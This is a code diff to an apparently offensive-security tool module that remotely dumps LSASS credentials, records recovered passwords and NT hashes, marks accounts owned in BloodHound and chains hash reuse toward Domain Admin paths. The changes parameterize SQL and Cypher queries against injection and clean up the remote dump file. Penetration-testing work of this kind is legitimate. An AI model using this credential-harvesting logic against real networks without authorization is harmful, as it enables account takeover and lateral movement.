@@ -79,26 +79,26 @@ def process_creds(context, connection, credentials_data, dbconnection, cursor, d
         if result["password"] is not None:
             context.log.highlight(f"Found a cleartext password for: {username}:{password}. Adding to the DB and marking user as owned in BH.")
             cursor.execute(
-                "UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'",
-                [password],
+                "UPDATE admin_users SET password = ? WHERE upper(substr(username, 1, ?)) = ?",
+                [password, len(username), username.upper()],
             )
             username = f"{username.upper()}@{domain.upper()}"
             dbconnection.commit()
             session = driver.session()
-            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
+            session.run("MATCH (u) WHERE u.name = $username SET u.owned=True RETURN u,u.name,u.owned", username=username)
         if nthash == "aad3b435b51404eeaad3b435b51404ee" or nthash == "31d6cfe0d16ae931b73c59d7e0c089c0":
             context.log.fail(f"Hash for {username} is expired.")
         elif username not in found_users and nthash is not None:
             context.log.highlight(f"Found hashes for: '{username}:{nthash}'. Adding them to the DB and marking user as owned in BH.")
             found_users.append(username)
             cursor.execute(
-                "UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'",
-                [nthash],
+                "UPDATE admin_users SET hash = ? WHERE upper(substr(username, 1, ?)) = ?",
+                [nthash, len(username), username.upper()],
             )
             dbconnection.commit()
             username = f"{username.upper()}@{domain.upper()}"
             session = driver.session()
-            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
+            session.run("MATCH (u) WHERE u.name = $username SET u.owned=True RETURN u,u.name,u.owned", username=username)
             path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.owned=true AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
             paths = list(path_to_da.data())
 
@@ -118,12 +118,12 @@ def initial_run(connection, cursor):
     password = getattr(connection, "password", "")
     nthash = getattr(connection, "nthash", "")
     cursor.execute(
-        "UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'",
-        [password],
+        "UPDATE admin_users SET password = ? WHERE upper(substr(username, 1, ?)) = ?",
+        [password, len(username), username.upper()],
     )
     cursor.execute(
-        "UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'",
-        [nthash],
+        "UPDATE admin_users SET hash = ? WHERE upper(substr(username, 1, ?)) = ?",
+        [nthash, len(username), username.upper()],
     )
 
 
@@ -188,7 +188,7 @@ class NXCModule:
         )
         if session.smb_session is None:
             context.log.fail("Couldn't connect to remote host. Password likely expired/changed. Removing from DB.")
-            cursor.execute(f"UPDATE admin_users SET hash = NULL WHERE username LIKE '{username}'")
+            cursor.execute("UPDATE admin_users SET hash = NULL WHERE username = ? COLLATE NOCASE", [f"{username}@{domain_name}"])
             return False
         dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
         if dumper is None:
@@ -198,9 +198,20 @@ class NXCModule:
         if file is None:
             context.log.fail("Unable to dump lsass")
             return False
-        credentials, tickets, masterkeys = Parser(host, file).parse()
-        file.close()
-        ImpacketFile.delete(session, file.get_file_path())
+        try:
+            parsed = Parser(host, file).parse()
+        finally:
+            # Delete the remote file even when parsing failed, and even if closing it fails
+            try:
+                file.close()
+            except Exception as e:
+                context.log.debug(f"Error closing dumper file: {e}")
+            if not ImpacketFile.delete(session, file.get_file_path()):
+                context.log.fail(f"[OPSEC] Failed to delete lsassy dumper file: {file.get_file_path()}")
+        if parsed is None:
+            context.log.fail("Unable to parse lsass dump")
+            return False
+        credentials, tickets, masterkeys = parsed
         if credentials is None:
             credentials = []
         credentials = [cred.get_object() for cred in credentials if not cred.get_username().endswith("$")]
@@ -236,7 +247,7 @@ class NXCModule:
         for user in compromised_users:
             for pc in admin_access:
                 if user[0] in pc[1]:
-                    cursor.execute(f"SELECT * FROM pc_and_admins WHERE pc_name = '{pc[0]}' AND dumped NOT LIKE 'TRUE'")
+                    cursor.execute("SELECT * FROM pc_and_admins WHERE pc_name = ? AND dumped NOT LIKE 'TRUE'", [pc[0]])
                     more_to_dump = cursor.fetchall()
                     if len(more_to_dump) > 0:
                         context.log.display(f"User {user[0]} has more access to {pc[0]}. Attempting to dump.")
@@ -246,8 +257,10 @@ class NXCModule:
                         connection.nthash = user[1]
                         connection.nthash = user[1]
                         try:
-                            self.run_lsassy(context, connection, cursor)
-                            cursor.execute("UPDATE pc_and_admins SET dumped = 'TRUE' WHERE pc_name LIKE '" + pc[0] + "%'")
+                            if self.run_lsassy(context, connection, cursor) is False:
+                                context.log.fail(f"Failed to dump lsassy on {pc[0]}")
+                                continue
+                            cursor.execute("UPDATE pc_and_admins SET dumped = 'TRUE' WHERE pc_name = ?", [pc[0]])
 
                             process_creds(
                                 context,
